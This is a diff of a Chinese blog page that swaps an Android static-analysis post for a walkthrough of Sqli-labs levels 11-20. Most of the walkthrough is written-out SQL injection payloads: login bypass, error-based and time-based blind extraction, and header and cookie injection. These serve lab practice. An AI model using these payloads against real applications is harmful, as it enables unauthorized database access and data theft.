@@ -79,22 +79,34 @@
 
 
 
-<meta name="description" content="Android 基础知识了解Android 应用的逻辑代码是由Java进行开发，所以是第一层就是java代码Java 虚拟机 JVM 运行的是 java 文件编译过后的class文件Android 虚拟机 Dalvik并不是执行Java虚拟机JVM编译后生成的class文件，而是执行再重新整合打包后生成的dex文件编译之后的smali文件  APK：是编译完成后的Android应用程序安装包 de">
+<meta name="description" content="和前十关不一样的是，接下来几题是POST注入题型，根据POST表单提交的数据来进行注入，其实也就是输入点的不同 Less-11首先看到两个输入框，输入错误的账户密码不显示，输入一下特殊字符看看会不会报错 两个输入框均输入万能密码&amp;#39;or &amp;#39;1&amp;#39;=&amp;#39;1，显示出第一个用户，证明账号密码处全部被置为空，默认输出一个账户，证明应该是单引号对其闭合了，猜测sql语句格式应该是u">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Android-静态分析">
-<meta property="og:url" content="http://wcute.github.io/2019/01/13/Android-静态分析/index.html">
+<meta property="og:title" content="Sqli-labs闯关详解（11-20）">
+<meta property="og:url" content="http://wcute.github.io/2019/05/14/Sqli-labs闯关详解（11-20）/index.html">
 <meta property="og:site_name" content="鸡翅儿">
-<meta property="og:description" content="Android 基础知识了解Android 应用的逻辑代码是由Java进行开发，所以是第一层就是java代码Java 虚拟机 JVM 运行的是 java 文件编译过后的class文件Android 虚拟机 Dalvik并不是执行Java虚拟机JVM编译后生成的class文件，而是执行再重新整合打包后生成的dex文件编译之后的smali文件  APK：是编译完成后的Android应用程序安装包 de">
+<meta property="og:description" content="和前十关不一样的是，接下来几题是POST注入题型，根据POST表单提交的数据来进行注入，其实也就是输入点的不同 Less-11首先看到两个输入框，输入错误的账户密码不显示，输入一下特殊字符看看会不会报错 两个输入框均输入万能密码&amp;#39;or &amp;#39;1&amp;#39;=&amp;#39;1，显示出第一个用户，证明账号密码处全部被置为空，默认输出一个账户，证明应该是单引号对其闭合了，猜测sql语句格式应该是u">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-490d17281118c56d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-332c87b55cdfd4c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-5bbc17dc41f161ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-a0c18089367b8af2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-01-16T05:06:13.933Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-42d99d4c20c623ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-4d6c46b3c282502c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-e90d87862476b8f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-ab84799e24fbcf38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-80383914d3ecbb1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-dac8037d5e8d021d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-616546f4ad8a4e5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-ebab3935e5868957.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-e561405409c0e517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-d44253a26784d231.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-6a3d3b4abc1979fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-08947c76f0c41564.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-6c293d34c91b04f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-4fcd1c13bd31251d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-2f8e45179ef64c39.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/12585049-0ddee0d90c78c940.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-05-16T00:37:58.202Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Android-静态分析">
-<meta name="twitter:description" content="Android 基础知识了解Android 应用的逻辑代码是由Java进行开发，所以是第一层就是java代码Java 虚拟机 JVM 运行的是 java 文件编译过后的class文件Android 虚拟机 Dalvik并不是执行Java虚拟机JVM编译后生成的class文件，而是执行再重新整合打包后生成的dex文件编译之后的smali文件  APK：是编译完成后的Android应用程序安装包 de">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-490d17281118c56d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta name="twitter:title" content="Sqli-labs闯关详解（11-20）">
+<meta name="twitter:description" content="和前十关不一样的是，接下来几题是POST注入题型，根据POST表单提交的数据来进行注入，其实也就是输入点的不同 Less-11首先看到两个输入框，输入错误的账户密码不显示，输入一下特殊字符看看会不会报错 两个输入框均输入万能密码&amp;#39;or &amp;#39;1&amp;#39;=&amp;#39;1，显示出第一个用户，证明账号密码处全部被置为空，默认输出一个账户，证明应该是单引号对其闭合了，猜测sql语句格式应该是u">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/12585049-42d99d4c20c623ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -124,13 +136,13 @@
 
 
 
-  <link rel="canonical" href="http://wcute.github.io/2019/01/13/Android-静态分析/">
+  <link rel="canonical" href="http://wcute.github.io/2019/05/14/Sqli-labs闯关详解（11-20）/">
 
 
 
 
 
-  <title>Android-静态分析 | 鸡翅儿</title>
+  <title>Sqli-labs闯关详解（11-20） | 鸡翅儿</title>
   
 
 
@@ -289,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2019/01/13/Android-静态分析/">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2019/05/14/Sqli-labs闯关详解（11-20）/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="wcute">
@@ -306,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Android-静态分析</h1>
+          <h1 class="post-title" itemprop="name headline">Sqli-labs闯关详解（11-20）</h1>
         
 
         <div class="post-meta">
@@ -318,8 +330,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-13T11:04:25+08:00">
-                2019-01-13
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-14T19:23:00+08:00">
+                2019-05-14
               </time>
             
 
@@ -341,8 +353,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/Android/" itemprop="url" rel="index">
-                    <span itemprop="name">Android</span>
+                  <a href="/categories/靶场练习/" itemprop="url" rel="index">
+                    <span itemprop="name">靶场练习</span>
                   </a>
                 </span>
 
@@ -378,54 +390,40 @@
       
 
       
-        <h3 id="Android-基础知识了解"><a href="#Android-基础知识了解" class="headerlink" title="Android 基础知识了解"></a>Android 基础知识了解</h3><p>Android 应用的逻辑代码是由Java进行开发，所以是第一层就是java代码<br>Java 虚拟机 <code>JVM</code> 运行的是 <code>java</code> 文件<code>编译</code>过后的<code>class</code>文件<br>Android 虚拟机 <code>Dalvik</code>并不是执行<code>Java</code>虚拟机<code>JVM</code>编译后生成的<code>class</code>文件，而是执行再重新整合打包后生成的<code>dex</code>文件编译之后的<code>smali</code>文件</p>
-<ul>
-<li>APK：是编译完成后的Android应用程序安装包</li>
-<li>dex 文件：是class文件的打包文件</li>
-<li>smali 文件：是Dalvik字节码文件</li>
-<li>class 文件：是JVM字节码文件</li>
-</ul>
-<h4 id="Android-APK文件结构"><a href="#Android-APK文件结构" class="headerlink" title="Android APK文件结构"></a>Android APK文件结构</h4><ul>
-<li>assets 目录<br>存放需要打包到 APK 的静态文件</li>
-<li>META-INF 目录<br>存放应用程序签名和证书的目录，保证系统安全和包的完整性</li>
-<li>res 目录<br>存放应用程序的资源，图片、字符串等</li>
-<li>lib 目录<br>程序依赖的 native 库</li>
-<li>AndroidMainfest.xml 文件<br>应用程序的配置文件，描述应用的名字、版本、权限、引用的库文件等</li>
-<li>classes.dex 文件<br>Dex可执行文件</li>
-<li>resources.arsc 文件<br>编译后资源二进制文件索引，记录资源文件和资源文件 ID 映射关系</li>
-</ul>
-<h3 id="静态分析定义"><a href="#静态分析定义" class="headerlink" title="静态分析定义"></a>静态分析定义</h3><p>在不运行代码的情况下，采用词法分析、语法分析等手段对程序文件进行扫描从而生成程序的反汇编代码，然后阅读反汇编代码来掌握程序功能的一种技术</p>
-<h3 id="分析大概流程"><a href="#分析大概流程" class="headerlink" title="分析大概流程"></a>分析大概流程</h3><ol>
-<li>对APK文件进行反编译</li>
-</ol>
-<ul>
-<li>DEX 文件反编译<br>反编译到 smali 工具：<code>apktool</code> <code>Baksmali</code> <code>smali</code><blockquote>
-<ul>
-<li>apktool 反编译<br>apktool d crackme02.apk<br><img src="https://upload-images.jianshu.io/upload_images/12585049-490d17281118c56d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-332c87b55cdfd4c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></li>
-<li>apktool 回编译生成<code>test.apk</code>文件<br>apktool b crackme02 -o test.apk<br><img src="https://upload-images.jianshu.io/upload_images/12585049-5bbc17dc41f161ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></li>
-</ul>
-</blockquote>
-</li>
-</ul>
-<p>反编译到 java 工具：<code>dex2jar+JD-GUI</code> <code>jadx</code> <code>jeb</code> <code>AndroidKiller</code></p>
-<ul>
-<li>so 文件反编译（一般存放在<code>lib</code>目录下）<br>常用工具：<code>IDA</code> <code>readelf</code></li>
-<li>odex 文件反编译<blockquote>
-<ol>
-<li>安装测试 apk ，使用<code>adb</code>连接模拟器<br>AndroidKiller_v1.3.1\bin\adb&gt; adb connect 127.0.0.1:21503<br>connected to 127.0.0.1:21503<br>AndroidKiller_v1.3.1\bin\adb&gt; adb forward tcp:31415 tcp:31415</li>
-<li>进入apk shell，拷贝<code>system/framework</code>内容<br>AndroidKiller_v1.3.1\bin\adb&gt; adb shell<br>root@SM-G9350:/ # cd /system<br>root@SM-G9350:/system # cp -r framework /sdcard<br>root@SM-G9350:/system # exit<br>AndroidKiller_v1.3.1\bin\adb&gt; adb pull /sdcard/framework C:\Users\Shinelon\Desktop\test</li>
-<li>将 <code>odex</code> 反编译为 <code>smali</code> 文件<br>将<code>smali-xxx.jar</code> <code>baksmali-xxx.jar</code> <code>baksmali</code> <code>smali</code>四个文件及<code>odex</code>文件与<code>framwork</code> 文件放置同一目录下，执行命令生成<code>out</code>文件<br>test&gt; java -jar baksmali.jar -x test.odex -d framework</li>
-<li>将<code>smali</code>转为<code>dex</code>文件，执行命令生成<code>test.dex</code>文件<br>test&gt; java -jar smali.jar out -o test.dex<br><img src="https://upload-images.jianshu.io/upload_images/12585049-a0c18089367b8af2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></li>
-</ol>
-</blockquote>
-</li>
-</ul>
-<ol start="2">
-<li>获取软件的基本信息</li>
-<li>根据<code>AndroidMainfest.xml</code>文件分析应用权限以及四大组件是否可以导出的一些问题</li>
-<li>分析敏感函数</li>
-</ol>
-<p>参考链接：<br><a href="https://www.cnblogs.com/doit8791/p/5223201.html" target="_blank" rel="noopener">https://www.cnblogs.com/doit8791/p/5223201.html</a><br><a href="https://www.cnblogs.com/ichunqiu/archive/2018/08/31/9565028.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/archive/2018/08/31/9565028.html</a></p>
+        <p>和前十关不一样的是，接下来几题是POST注入题型，根据POST表单提交的数据来进行注入，其实也就是输入点的不同</p>
+<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>首先看到两个输入框，输入错误的账户密码不显示，输入一下特殊字符看看会不会报错<br><img src="https://upload-images.jianshu.io/upload_images/12585049-42d99d4c20c623ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>两个输入框均输入万能密码<code>&#39;or &#39;1&#39;=&#39;1</code>，显示出第一个用户，证明账号密码处全部被置为空，默认输出一个账户，证明应该是单引号对其闭合了，猜测sql语句格式应该是<code>username=&#39;username&#39; and password=&#39;password&#39;</code><br>使用其中一个字段测试，这里使用username字段测试，输入<code>&#39;or 1=1 order by 3 #</code>显示字段不存在<br><img src="https://upload-images.jianshu.io/upload_images/12585049-4d6c46b3c282502c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>测试<code>&#39;or 1=1 order by 2 #</code>输出一个账户密码，由此判断有两个字段<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e90d87862476b8f1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>由于web界面比较不友好，可以使用burpsuite抓包进行注入<br><img src="https://upload-images.jianshu.io/upload_images/12585049-ab84799e24fbcf38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p>payload其实和之前的是一样的，只不过是post型和get型输入点不同，还是放上来吧<br>这里使用报错注入<br>注当前数据库名<br><code>&#39; or 1=1 union select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注第一个表名<br><code>&#39; or 1=1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注user表里的第二个字段<br><code>&#39; or 1=1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>&#39; or 1=1 union select count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>与上一题几乎一样，只不过闭合方式改为<code>&quot;)</code>，所以直接放payload</p>
+<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>&quot;) or 1=1 union select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注第一个表名<br><code>&quot;) or 1=1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注user表里的第二个字段<br><code>&quot;) or 1=1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>&quot;) or 1=1 union select count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><p>与十一题也几乎一样，只不过闭合方式改为<code>&#39;)</code>，所以直接放payload</p>
+<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>&#39;) or 1=1 union select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注第一个表名<br><code>&#39;) or 1=1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注user表里的第二个字段<br><code>&#39;) or 1=1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>&#39;) or 1=1 union select count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><p>和十一题相似，与十一题也几乎一样，只不过闭合方式改为<code>&quot;</code>，所以直接放payload</p>
+<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><p>注当前数据库名<br><code>&quot; or 1=1 union select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注第一个表名<br><code>&quot; or 1=1 union select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注user表里的第二个字段<br><code>&quot; or 1=1 union select count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<p>注字段的值，这里注 users 表里的 usrname 字段为例<br><code>&quot; or 1=1 union select count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x; #</code></p>
+<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>15题主要考查的基于时间的延迟注入<br>直接放payload了 </p>
+<h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><p>爆数据库第一个字母<br><code>&#39; or 1=1 and If(ascii(substr(database(),1,1))=115,1,sleep(5)) #</code><br>爆第一个数据库(security)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第二个字段(id)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1,1))=105,sleep(5),1) #</code></p>
+<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>与15题类似，闭合条件改为<code>&quot;)</code><br>直接放payload</p>
+<h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><p>爆数据库第一个字母<br><code>&quot;) or 1=1 and If(ascii(substr(database(),1,1))=115,1,sleep(5)) #</code><br>爆第一个数据库(security)的第一个字母<br><code>&quot;) or 1=1 and If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第一个字母<br><code>&quot;) or 1=1 and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第二个字段(id)的第一个字母<br><code>&quot;) or 1=1 and If(ascii(substr((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1,1))=105,sleep(5),1) #</code></p>
+<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><p>17题打开提示密码重置，输已存在用户名密码，提示更新成功，可以先遍历一下已存在用户名，存在即更新成功。这里测出存在 admin 用户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-80383914d3ecbb1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>执行的应该是update语句<br>可以尝试对new password字段进行闭合，由于不知道是否能注成功，可以使用延迟注入，根据返回时间来判断是否成功注入<br>添加单引号，报错，根据报错信息判断应该使用单引号进行闭合<br><img src="https://upload-images.jianshu.io/upload_images/12585049-dac8037d5e8d021d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>尝试延迟，不知道什么原因，我这个延迟的时间有点长，但是不使用sleep函数返回还是很快的，由此可以判断注入成功<br><img src="https://upload-images.jianshu.io/upload_images/12585049-616546f4ad8a4e5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>接下来和之前一样放payload了</p>
+<h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><p>爆数据库第一个字母<br><code>&#39; or 1=1 and If(ascii(substr(database(),1,1))=115,1,sleep(5)) #</code><br>爆第一个数据库(security)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第二个字段(id)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1,1))=105,sleep(5),1) #</code></p>
+<h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>首先看到一个 ip ，但是测试输入单引号等特殊字符返回页面均不改变，测试一下正常输入，利用17题更新的密码，登陆过后看到<code>your user agent:...</code>等字样，猜测有可能是头部注入<br><img src="https://upload-images.jianshu.io/upload_images/12585049-ebab3935e5868957.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>依旧开启burpsuite进行抓包，将<code>user-agent</code>字段改为<code>123&#39;</code>，页面直接输出，此处应该就是注入点了<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e561405409c0e517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>自己尝试了报错注入和时间盲注，但是都没有注出来，查了网上payload 还是换一种报错注入方式吧，这里使用updatexml进行注入<br>直接放payload吧还是</p>
+<h5 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h5><p>注数据库<br><code>&#39; and updatexml(1,concat(0x3a,database()),1))#</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-d44253a26784d231.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>和18题类似，只不过注点换了，输入正确账户密码提示<code>your referer is ...:</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-6a3d3b4abc1979fe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>直接放payload</p>
+<h5 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h5><p>注数据库<br><code>&#39; and updatexml(1,concat(0x3a,database()),1))#</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-08947c76f0c41564.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>输入正确账号密码后出现如图情况<br><img src="https://upload-images.jianshu.io/upload_images/12585049-6c293d34c91b04f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>根据提示这题考查cookie注入，开启抓包，删除cookie从登陆开始抓包。<br>输入账号密码，提交数据后抓包，查看cookie参数并没有什么特殊，对任意字段添加特殊字符也均无反应，后来突然发现把第一个post提交数据包forward过后还有一个包，并且发现cookie有一个特殊字段，<code>uname</code>，猜测注点应该就是在这了<br><img src="https://upload-images.jianshu.io/upload_images/12585049-4fcd1c13bd31251d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>尝试特殊字符 闭合<code>uname</code>字段<br>加单引号报错，尝试payload<code>&#39; and sleep(3) #</code>成功延时，所以此题是使用单引号闭合<br><img src="https://upload-images.jianshu.io/upload_images/12585049-2f8e45179ef64c39.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>尝试探测字段，4显示不存在，3显示正常，所以三个字段<br><img src="https://upload-images.jianshu.io/upload_images/12585049-0ddee0d90c78c940.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<h5 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h5><p>爆数据库(security)第一个字母<br><code>&#39; or 1=1 and If(ascii(substr(database(),1,1))=115,1,sleep(5)) #</code><br>爆第一个数据库(security)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1) #</code><br>爆当前数据库(security)的第一个表(emails)的第二个字段(id)的第一个字母<br><code>&#39; or 1=1 and If(ascii(substr((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1,1))=105,sleep(5),1) #</code></p>
 
       
     </div>
@@ -450,8 +448,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/10/Docker（一） 入门及安装/" rel="next" title="Docker（一） 入门及安装">
-                <i class="fa fa-chevron-left"></i> Docker（一） 入门及安装
+              <a href="/2019/05/14/Sqli-labs闯关详解（1-10）/" rel="next" title="Sqli-labs闯关详解（1-10）">
+                <i class="fa fa-chevron-left"></i> Sqli-labs闯关详解（1-10）
               </a>
             
           </div>
@@ -459,10 +457,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/16/Android-动态分析/" rel="prev" title="Android-动态分析">
-                Android-动态分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -585,7 +579,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Android-基础知识了解"><span class="nav-number">1.</span> <span class="nav-text">Android 基础知识了解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Android-APK文件结构"><span class="nav-number">1.1.</span> <span class="nav-text">Android APK文件结构</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#静态分析定义"><span class="nav-number">2.</span> <span class="nav-text">静态分析定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析大概流程"><span class="nav-number">3.</span> <span class="nav-text">分析大概流程</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-11"><span class="nav-number">1.</span> <span class="nav-text">Less-11</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload"><span class="nav-number">1.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-12"><span class="nav-number">2.</span> <span class="nav-text">Less-12</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-1"><span class="nav-number">2.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-13"><span class="nav-number">3.</span> <span class="nav-text">Less-13</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-2"><span class="nav-number">3.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-14"><span class="nav-number">4.</span> <span class="nav-text">Less-14</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-3"><span class="nav-number">4.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-15"><span class="nav-number">5.</span> <span class="nav-text">Less-15</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-4"><span class="nav-number">5.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-16"><span class="nav-number">6.</span> <span class="nav-text">Less-16</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-5"><span class="nav-number">6.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-17"><span class="nav-number">7.</span> <span class="nav-text">Less-17</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-6"><span class="nav-number">7.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Less-18"><span class="nav-number">8.</span> 